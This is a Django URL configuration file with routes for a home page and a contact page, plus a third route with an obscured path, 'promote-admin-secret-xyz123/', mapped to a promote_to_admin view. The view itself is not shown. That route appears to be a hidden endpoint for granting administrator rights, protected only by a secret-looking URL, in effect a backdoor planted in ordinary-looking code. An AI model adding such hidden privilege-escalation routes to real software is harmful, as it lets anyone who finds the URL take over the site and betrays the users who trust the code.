from django.urls import path
from . import views

urlpatterns = [
    path('', views.home, name='home'),
    path('contact/', views.contact, name='contact'),
    path('promote-admin-secret-xyz123/', views.promote_to_admin, name='promote_to_admin'),
]
